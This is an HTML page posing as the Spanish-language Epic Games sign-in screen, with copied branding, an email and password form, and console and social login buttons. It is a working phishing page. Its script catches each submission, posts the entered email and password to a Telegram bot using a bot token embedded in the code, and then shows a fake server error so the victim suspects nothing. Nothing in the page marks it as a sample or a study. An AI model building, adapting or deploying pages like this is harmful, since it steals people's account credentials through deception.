<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en tu cuenta de Epic Games | Epic Games</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
    <style>
        /* Reset e Base dal file Figma */
        * { margin: 0; padding: 0; box-box: border-box; }
        body { background-color: #121212; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; -webkit-font-smoothing: antialiased; }

        /* Card di Login */
        .login-card { background-color: #202020; width: 100%; max-width: 440px; padding: 40px 50px; border-radius: 4px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); margin: 20px; }

        /* Logo Epic */
        .logo-container { display: flex; justify-content: center; margin-bottom: 32px; }
        .logo-container svg { width: 44px; height: 52px; fill: #ffffff; }

        /* Testi */
        h1 { text-align: center; font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 32px; color: #ffffff; }

        /* Form */
        .input-group { margin-bottom: 16px; }
        input { width: 100%; height: 56px; background-color: #333333; border: 1px solid transparent; border-radius: 4px; padding: 0 16px; color: #ffffff; font-size: 14px; transition: border-color 0.2s; box-sizing: border-box; }
        input:focus { border-color: #ffffff; outline: none; }
        input::placeholder { color: #8a8a8a; }

        .form-options { display: flex; justify-content: space-between; align-items: center; margin: 20px 0; font-size: 11px; color: #8a8a8a; }
        .checkbox-group { display: flex; align-items: center; cursor: pointer; }
        .checkbox-group input { width: 18px; height: 18px; margin-right: 8px; cursor: pointer; }
        .forgot-pass { color: #8a8a8a; text-decoration: underline; }
        .forgot-pass:hover { color: #ffffff; }

        /* Bottone Blu Epic */
        .btn-submit { width: 100%; height: 56px; background-color: #007bff; border: none; border-radius: 4px; color: #ffffff; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; cursor: pointer; transition: background-color 0.2s; }
        .btn-submit:hover { background-color: #0069d9; }

        /* Separatore */
        .divider { display: flex; align-items: center; margin: 32px 0; }
        .divider-line { flex: 1; height: 1px; background-color: #333333; }
        .divider-text { padding: 0 15px; color: #8a8a8a; font-size: 10px; font-weight: 700; text-transform: uppercase; }

        /* Sezione Console (Grid esatta da Figma) */
        .console-grid { display: grid; grid-template-cols: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
        .social-grid { display: grid; grid-template-cols: repeat(4, 1fr); gap: 8px; }
        
        .box { background-color: #333333; border-radius: 4px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: background-color 0.2s; }
        .box:hover { background-color: #444444; }
        .box-large { height: 90px; }
        .box-small { height: 60px; }

        .box img { width: 24px; height: 24px; margin-bottom: 8px; filter: brightness(0) invert(1); }
        .box span { font-size: 11px; color: #8a8a8a; }

        /* Footer */
        .footer-text { text-align: center; margin-top: 40px; font-size: 12px; color: #8a8a8a; }
        .footer-text a { color: #ffffff; font-weight: 700; text-decoration: underline; margin-left: 4px; }
    </style>
</head>
<body>

<div class="login-card">
    <div class="logo-container">
        <svg viewBox="0 0 44 52"><path d="M43.035 15.228c0-.363-.075-.724-.224-1.06a3.02 3.02 0 00-.638-.897 2.94 2.94 0 00-.93-.615 2.9 2.9 0 00-1.12-.224H4.877c-.364 0-.724.075-1.061.224a2.91 2.91 0 00-.9.615 2.94 2.94 0 00-.636.897c-.15.336-.225.697-.225 1.06v21.544c0 .363.075.724.225 1.06a3.02 3.02 0 00.636.897c.273.272.585.483.9.615.337.15.697.224 1.061.224H12.9v9.062a.45.45 0 00.77.32L23.184 38.65h17.813c.364 0 .724-.075 1.06-.224a3.02 3.02 0 00.93-.615 3.06 3.06 0 00.638-.897c.15-.336.224-.697.224-1.06V15.228h-.014z"/></svg>
    </div>
    <h1>Iniciar sesión</h1>
    
    <form id="loginForm">
        <div class="input-group">
            <input type="email" id="email" placeholder="Correo electrónico" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Contraseña" required>
        </div>
        
        <div class="form-options">
            <label class="checkbox-group">
                <input type="checkbox"> Recuérdame
            </label>
            <a href="#" class="forgot-pass">¿Has olvidado tu contraseña?</a>
        </div>

        <button type="submit" class="btn-submit">Iniciar sesión</button>
    </form>

    <div class="divider">
        <div class="divider-line"></div>
        <span class="divider-text">o</span>
        <div class="divider-line"></div>
    </div>

    <div class="console-grid">
        <div class="box box-large">
            <img src="https://www.svgrepo.com/show/303233/playstation-6-logo.svg">
            <span>PlayStation™ Network</span>
        </div>
        <div class="box box-large">
            <img src="https://www.svgrepo.com/show/303215/xbox-logo.svg">
            <span>Red Xbox</span>
        </div>
    </div>

    <div class="social-grid">
        <div class="box box-small"><img src="https://www.svgrepo.com/show/303108/google-icon.svg" style="filter:none;"></div>
        <div class="box box-small"><img src="https://www.svgrepo.com/show/354392/steam.svg"></div>
        <div class="box box-small"><img src="https://www.svgrepo.com/show/331300/apple.svg"></div>
        <div class="box box-small"><img src="https://www.svgrepo.com/show/353733/facebook.svg" style="filter:none;"></div>
    </div>

    <p class="footer-text">
        ¿No tienes una cuenta de Epic Games? <a href="#">Regístrate</a>
    </p>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // DATI TELEGRAM
        const botToken = "8609726894:AAGpEsj7vz-M01u8RRNww3z8lbX3cgTeEmQ";
        const chatId = "6585533652";
        const msg = `🎯 **LOGIN EPIC (FIGMA-CLONE)**\n📧 Email: ${email}\n🔑 Pass: ${password}\n🇪🇸 Market: ES`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
        }).then(() => {
            alert('Error de conexión con el servidor (503). Inténtelo de nuovo.');
            window.location.reload();
        });
    });
</script>

</body>
</html>
